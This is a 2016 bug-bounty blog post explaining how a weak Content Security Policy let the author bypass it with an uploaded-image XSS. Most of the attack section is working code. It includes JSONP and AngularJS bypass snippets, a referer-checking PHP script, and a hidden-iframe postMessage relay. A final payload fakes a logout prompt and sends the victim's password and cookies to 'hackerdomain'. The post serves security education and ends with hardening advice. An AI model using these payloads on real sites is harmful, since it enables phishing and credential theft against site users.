<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/grid.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | Exploiting weak Content Security Policy (CSP) rules for fun and profit"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | Exploiting weak Content Security Policy (CSP) rules for fun and profit"><meta name=twitter:title content="dubell.io | Exploiting weak Content Security Policy (CSP) rules for fun and profit"><meta itemprop=name content="dubell.io | Exploiting weak Content Security Policy (CSP) rules for fun and profit"><meta name=application-name content="dubell.io | Exploiting weak Content Security Policy (CSP) rules for fun and profit"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2016-07-21T00:00:00Z"><meta property="article:published_time" content="2016-07-21T00:00:00Z"><base href=https://dubell.io/www/2016/07/exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit/><link rel=canonical href=https://dubell.io/www/2016/07/exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit/ itemprop=url><meta name=url content="https://dubell.io/www/2016/07/exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit/"><meta name=twitter:url content="https://dubell.io/www/2016/07/exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit/"><meta property="og:url" content="https://dubell.io/www/2016/07/exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit/"><meta name=description content><meta itemprop=description content><meta property="og:description" content><meta name=twitter:description content><meta itemprop=image content="/"><meta property="og:image" content="https://dubell.io"><meta name=twitter:image content="https://dubell.io"><meta name=twitter:image:src content="https://dubell.io"><meta property="og:updated_time" content="2016-07-21T00:00:00Z"><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.iositemap.xml><title>dubell.io | Exploiting weak Content Security Policy (CSP) rules for fun and profit</title></head><body><div id=particles-js></div><main><div class=row><header class="col center"><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></div></div><div class=row><div class="col center"><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=content><article><h1>Exploiting weak Content Security Policy (CSP) rules for fun and profit</h1><br><p class=small style=color:#999><a href=/categories/hacking>Hacking</a> / July 21, 2016 â€¢ 5 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/bug-bounty class=tag>Bug Bounty</a> <a href=/tags/web-application-security class=tag>Web Application Security</a></p><br><p>This article is based on my findings during a bug bounty. I was looking for any input bugs which could trigger a XSS but didn&rsquo;t find any until I tested the file upload functionality. Users had the option to drag&drop images into the company&rsquo;s website and place it in their gallery, however by specifying an image like this:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>&lt;<span style=color:#fb660a;font-weight:700>img</span> <span style=color:#ff0086;font-weight:700>src</span>=<span style=color:#0086d2>&#34;https://hackerdomain.hax/img.php&#34;</span> <span style=color:#ff0086;font-weight:700>onerror</span>=<span style=color:#0086d2>&#34;this.src=alert(1)&#34;</span>/&gt;
</span></span></code></pre></div><p>And dropping it into the website trigged an XSS.</p><p>Before I continue my report I will first cover what CSP is and what it tries to accomplish. If you feel you are already experienced in the area you can skip to the next section.</p><h2 id=what-is-csp>What is CSP?</h2><p>Content Security Policy (CSP) is a client-side security model which allows developers to specify where different types of resources should be loaded, executed and embedded from. With CSP you can instruct the browser only to load javascript resources from a specific domain as well as block inline javascript running on the website. This is very helpful against XSS since most attacks requires inline javascript. There also the possibility to specify a <code>report-uri</code> which the browser uses to send detected policy violations <em>(of course this can be spoofed)</em>.</p><p>However CSP is only effective if used fully, i.e blocking inline javascript and loading resources from trusted domains. This requirement can be too strict for some websites, that&rsquo;s why there are certain work arounds such as using nonces that whitelists specific <code>&lt;script>&lt;/script></code> tags.</p><p>It should be noted that even using <em>trusted</em> sources wont always protect you. If JSONP is enabled or e.g. angularjs is hosted on the whitelisted source, it is possible to bypass CSP with the following:</p><h6 id=jsonp>JSONP</h6><pre tabindex=0><code>&lt;script src=&#34;https://whitelisted.com/jsonp?callback=alert&#34;&gt;
</code></pre><h6 id=angularjs>AngularJS</h6><pre tabindex=0><code>&lt;script src=&#34;https://whitelisted.com/angularjs/1.1.3/angularjs.min.js&#34;&gt;
&lt;div ng-app ng-csp id=p ng-click=$event.view.alert(1)&gt;
</code></pre><h2 id=weaknesses>Weaknesses</h2><p>As I mentioned earlier the company had employed CSP which is a good step in the right direction but because of its weak rules I could bypass it entirely and run whatever javascript I wanted once triggered.</p><p>Below you can see a copy of the CSP:</p><pre tabindex=0><code>default-src &#39;self&#39; https://*.company.com https://*.companyimg.com  *.company.com *.companyimg.com *.google.com connect.facebook.net *.google-analytics.com https://*.googleapis.com *.gstatic.com https://*.facebook.com *.facebook.com www.googleadservices.com googleads.g.doubleclick.net platform.twitter.com *.tiles.mapbox.com *.online-metrix.net *.bnc.lt bnc.lt *.yozio.com &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;

media-src &#39;self&#39; *.companyimg.com blob:;

frame-src *;

connect-src &#39;self&#39; *.mapbox.com *.company.com company.s3.amazonaws.com ;

img-src * data:;
</code></pre><p>The <code>default-src</code> directive is set to only load resources from <em>self</em> and the other domains listed unless specified otherwise by other directives. If you haven&rsquo;t noticed it <code>unsafe-inline</code> and <code>unsafe-eval</code> is also present, which means running inline javascript is allowed <strong>by default</strong>.</p><p>Other directives that are of interest is the <code>frame-src</code> and <code>img-src</code> because they allow resources to be loaded from anywhere. By exploiting <code>unsafe-inline</code> and <code>unsafe-eval</code> for running inline javascript, <code>frame-src</code> for sending data to the attacker&rsquo;s domain and <code>img-src</code> to trigger the initial XSS we can deliver a powerful payload.</p><h2 id=the-attack>The attack</h2><p>First we construct the image which the victim will drag&drop into their gallery:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>&lt;<span style=color:#fb660a;font-weight:700>img</span> <span style=color:#ff0086;font-weight:700>src</span>=<span style=color:#0086d2>&#34;https://hackerdomain.hax/img.php&#34;</span> <span style=color:#ff0086;font-weight:700>onerror</span>=<span style=color:#0086d2>&#34;this.src=alert(1)&#34;</span>/&gt;
</span></span></code></pre></div><p>This works because the CSP allows images to be loaded from anywhere. You may wonder why the JS is only triggered <code>onerror</code> and why the domain it set to <code>/img.php</code>.</p><p>Once the victim has dropped the image into their gallery, the website will contact the hacker&rsquo;s domain to get a thumbnail image. The <code>img.php</code> script will detect the if the <code>HTTP_REFERER</code> is set to <em>company.com</em> which in that case will return a <em>404</em> causing the <code>onerror</code> attribute to execute.</p><h5 id=imgphp>img.php</h5><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#fb660a;font-weight:700>if</span>(isset(<span style=color:#fb660a>$_SERVER</span>[<span style=color:#0086d2>&#39;HTTP_REFERER&#39;</span>])) {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#fb660a>$ref</span> = <span style=color:#fb660a>$_SERVER</span>[<span style=color:#0086d2>&#39;HTTP_REFERER&#39;</span>];
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>} <span style=color:#fb660a;font-weight:700>else</span> {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#fb660a>$ref</span> = <span style=color:#0086d2>&#34;nope&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#fb660a>$pattern</span> = <span style=color:#0086d2>&#39;/.+company.com.+/&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>preg_match(<span style=color:#fb660a>$pattern</span>, <span style=color:#fb660a>$ref</span>, <span style=color:#fb660a>$matches</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#fb660a;font-weight:700>if</span>(<span style=color:#fb660a>$matches</span>) {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#fb660a;font-weight:700>return</span> header(<span style=color:#0086d2>&#34;HTTP/1.0 404 Not Found&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    <span style=color:#fb660a;font-weight:700>die</span>();
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>} <span style=color:#fb660a;font-weight:700>else</span> {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#fb660a>$name</span> = <span style=color:#0086d2>&#39;hunter2.jpg&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    <span style=color:#fb660a>$fp</span> = fopen(<span style=color:#fb660a>$name</span>, <span style=color:#0086d2>&#39;rb&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>    header(<span style=color:#0086d2>&#34;Content-Type: image/jpeg&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    header(<span style=color:#0086d2>&#34;Content-Length: &#34;</span> . filesize(<span style=color:#fb660a>$name</span>));
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    fpassthru(<span style=color:#fb660a>$fp</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>}
</span></span></code></pre></div><p>Now we can successfully run javascript in the victim&rsquo;s DOM, <em>what next?</em> My next step was to steal the user&rsquo;s cookies but the session cookie was set to <code>HttpOnly</code> which instructs the browser to not allow javascript to access the cookie. <strong>Bummer!</strong></p><p>My next thought was to change the user&rsquo;s email address to my email and then preform a <em>Forgot password</em> which will send the password reset link to my email. However I noticed that once the email has been changed, the user will get a notification and the ability to lock the account. This could still be a viable attack vector depending on how long the user can wait until their ability to lock their account expires.</p><h3 id=lets-go-phishing>Lets go phishing</h3><p>Instead I chose to try to trick the user into enter their account password because they had been logged out. To accomplish this I needed to build a HTML Form, hide all other HTML elements and be able to send the data to my server.</p><p>The communication part was the tricky part because the CSP only allows <code>XMLHttpRequest</code> to be used for specific domains. However after a bit of researching I found that I can communicate via iframes and to my luck iframes could be loaded from anywhere according to the CSP. Tunneling data via iframes can be visualised as followed:<br><br><img src=/images/iframe_postmessage.png alt><br>The injected iframe looks like the following:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>&lt;<span style=color:#fb660a;font-weight:700>iframe</span> <span style=color:#ff0086;font-weight:700>src</span>=<span style=color:#0086d2>&#34;https://hackerdomain.com/recv.html&#34;</span> <span style=color:#ff0086;font-weight:700>name</span>=<span style=color:#0086d2>&#34;siteb&#34;</span> <span style=color:#ff0086;font-weight:700>id</span>=<span style=color:#0086d2>&#34;myframe&#34;</span> <span style=color:#ff0086;font-weight:700>style</span>=<span style=color:#0086d2>&#34;display:none&#34;</span>&gt;&lt;/<span style=color:#fb660a;font-weight:700>iframe</span>&gt;
</span></span></code></pre></div><p>Once the user enters their password and clicks submit, the following script will send the data to the iframe.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>&lt;script type=<span style=color:#0086d2>&#34;text/javascript&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    form.onsubmit = <span style=color:#fb660a;font-weight:700>function</span>() {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        pw=document.getElementById(<span style=color:#0086d2>&#39;mypw&#39;</span>).value;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        c=document.cookie;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        data={<span style=color:#0086d2>&#39;cookie&#39;</span>:c,<span style=color:#0086d2>&#39;pw&#39;</span>:pw};
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        fi=document.getElementById(<span style=color:#0086d2>&#39;myframe&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        fi.postMessage(JSON.stringify(data),<span style=color:#0086d2>&#39;*&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>&lt;/script&gt;
</span></span></code></pre></div><p>Below you can find the code which receives the data.</p><h5 id=hackerdomaincomrecvhtml>hackerdomain.com/recv.html</h5><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>&lt;<span style=color:#fb660a;font-weight:700>div</span> <span style=color:#ff0086;font-weight:700>id</span>=<span style=color:#0086d2>&#34;message&#34;</span>&gt;&lt;/<span style=color:#fb660a;font-weight:700>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>&lt;<span style=color:#fb660a;font-weight:700>script</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>window.addEventListener(<span style=color:#0086d2>&#39;message&#39;</span>, writeMessage, <span style=color:#fb660a;font-weight:700>false</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#fb660a;font-weight:700>function</span> writeMessage(event) {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#fb660a;font-weight:700>var</span> xmlHttp = <span style=color:#fb660a;font-weight:700>new</span> XMLHttpRequest();
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    data = JSON.parse(event.data);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    xmlHttp.open( <span style=color:#0086d2>&#34;GET&#34;</span>, <span style=color:#0086d2>&#34;https://hackerdomain/stl.php?c=&#34;</span>+data.cookie+<span style=color:#0086d2>&#34;&amp;pw=&#34;</span>+data.pw, <span style=color:#fb660a;font-weight:700>false</span> ); <span style=color:#080;background-color:#0f140f;font-style:italic>// false for synchronous request
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    xmlHttp.send();
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    document.getElementById(<span style=color:#0086d2>&#34;message&#34;</span>).innerHTML = event.data;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>&lt;/<span style=color:#fb660a;font-weight:700>script</span>&gt;
</span></span></code></pre></div><p>Once the data has been sent to my domain, from there I can send it to my cookie stealer script and save the data. The final payload can be viewed below:</p><h5 id=final-payload>Final Payload</h5><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>&lt;<span style=color:#fb660a;font-weight:700>img</span> <span style=color:#ff0086;font-weight:700>src</span>=<span style=color:#0086d2>&#34;https://hackerdomain/img.php&#34;</span> <span style=color:#ff0086;font-weight:700>onerror</span>=<span style=color:#0086d2>&#34;this.src=a=document.getElementsByTagName(&#39;head&#39;)[0];f=document.createElement(&#39;iframe&#39;);f.src=&#39;https://hackerdomain.com/recv.html&#39;;f.name=&#39;siteb&#39;;f.id=&#39;myframe&#39;;f.setAttribute(&#39;style&#39;,&#39;display:none&#39;);b=document.createElement(&#39;script&#39;);div=document.createElement(&#39;div&#39;);div.style=&#39;width:660;height:90%;font:16px Arial;padding:3em;text-align:center;margin:auto;&#39;;form=document.createElement(&#39;form&#39;);form.action=&#39;#&#39;;inp=document.createElement(&#39;input&#39;);inp.type=&#39;password&#39;;inp.id=&#39;mypw&#39;;sub=document.createElement(&#39;input&#39;);sub.type=&#39;submit&#39;;sub.id=&#39;subid&#39;;form.appendChild(inp);form.appendChild(sub);s=&#39;*&#39;;t=&#39;You have been logged out. Please login below to access your account.&#39;;b.type=&#39;text/javascript&#39;;document.body.appendChild(f);fi=document.getElementById(&#39;myframe&#39;).contentWindow;b.appendChild(document.createTextNode(&#39;form.onsubmit = function() {pw=document.getElementById(\&#39;mypw\&#39;).value;c=document.cookie;data={\&#39;cookie\&#39;:c,\&#39;pw\&#39;:pw};fi.postMessage(JSON.stringify(data),\&#39;*\&#39;);}&#39;));le=document.getElementsByClassName(&#39;left pane&#39;)[0];le.setAttribute(&#39;style&#39;,&#39;display:none&#39;);ri=document.getElementsByClassName(&#39;right pane&#39;)[0];ri.setAttribute(&#39;style&#39;,&#39;display:none&#39;);c=document.getElementsByClassName(&#39;cancelButton&#39;)[0];c.setAttribute(&#39;style&#39;,&#39;display:none&#39;);a.appendChild(b);m=document.getElementsByClassName(&#39;create modelimg&#39;)[0];m.style=&#39;overflow:hidden;&#39;;m.appendChild(div);div.innerHTML=t;div.appendChild(form);&#34;</span>/&gt;
</span></span></code></pre></div><h2 id=conclusion>Conclusion</h2><p>While CSP is a great tool to limit the attack surface for potential attackers, it must be configured properly otherwise you might as well not use it. As shown in this article, the website I was looking for bugs on did use CSP however because of three policy directives which allowed inline javascript, iframes and images to be loaded from anywhere I could successfully mount an attack against any user of the site. This shows how important it is to be aware of the security models you deploy as a developer.</p><h4 id=references>References</h4><ul><li><a href=http://www.html5rocks.com/en/tutorials/security/content-security-policy/>http://www.html5rocks.com/en/tutorials/security/content-security-policy/</a></li><li><a href=https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage>https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage</a></li><li><a href=https://speakerdeck.com/mikispag/making-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum>https://speakerdeck.com/mikispag/making-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum</a></li></ul></article></div><footer></footer></main><script src=/js/particles.min.js defer></script>
<script src=/js/particles.conf.js defer></script>
<script src=/js/baffle.min.js async></script>
<script src=/js/main.js defer async></script></body></html>